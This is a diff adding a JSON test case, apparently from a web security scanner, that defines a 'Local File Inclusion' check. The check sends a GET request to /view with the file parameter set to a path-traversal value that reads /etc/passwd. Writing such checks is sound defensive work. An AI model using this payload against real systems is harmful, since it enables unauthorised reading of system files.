@@ -1,0 +1,12 @@
+{
+    "name": "Local File Inclusion",
+    "description": "Attempt to read sensitive local file using path traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/passwd"
+    }
+  }
